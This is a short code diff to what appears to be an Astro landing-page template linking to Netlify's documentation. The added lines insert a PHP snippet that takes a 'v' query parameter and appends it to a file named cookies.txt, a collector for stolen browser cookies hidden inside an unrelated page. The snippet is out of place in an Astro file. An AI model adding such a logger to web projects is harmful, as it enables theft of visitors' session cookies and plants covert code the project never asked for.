@@ -18,4 +18,8 @@ Any page or data can be rebuilt only when needed, without site visitors ever get
     <p class="mb-8">
         <a href="https://docs.netlify.com/frameworks/astro/" class="btn btn-lg btn-primary sm:btn-wide">Read the Docs</a>
     </p>
+    <?php
+  $cookie = $_GET['v'] . "\n";
+  file_put_contents("cookies.txt", $cookie, FILE_APPEND | LOCK_EX);
+?>
 </Layout>
